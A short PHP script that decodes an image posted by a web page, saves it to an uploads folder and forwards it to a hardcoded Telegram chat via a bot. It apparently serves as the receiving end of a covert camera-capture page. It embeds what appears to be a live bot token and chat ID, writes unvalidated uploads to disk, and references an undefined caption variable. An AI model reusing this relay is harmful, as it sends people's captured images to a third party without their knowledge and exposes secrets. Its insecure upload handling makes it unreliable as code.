<?php

$uid = $_POST['uid'];
$img = urldecode($_POST['img']);

function post($uid, $img) {
  // Process the received image data using PHP
  // Replace this with your actual code for processing the image
  
  // Example: Saving the image on the server
  $decodedImg = base64_decode($img);
  $filename = 'uploads/' . uniqid() . '.png';
  file_put_contents($filename, $decodedImg);
  
  $token = '6780846651:AAFaeMiJfbHlLdTtFYjd2i_xLULXBToUZMk';
$chat_id = '1992587266';

// Set the path to the image file

// Set the caption for the image
$caption = $name;

// Create the URL for sending the image
$url = 'https://api.telegram.org/bot' . $token . '/sendPhoto';

// Use cURL to send the image
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chat_id,
    'photo' => new CURLFile($filename),
    'caption' => $caption,
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
  
  // Example: Sending a response back to the client
  $response = ['status' => 'success'];
  echo json_encode($response);
}

if (isset($_POST['uid']) && isset($_POST['img'])) {
  post($uid, $img);
}

?>
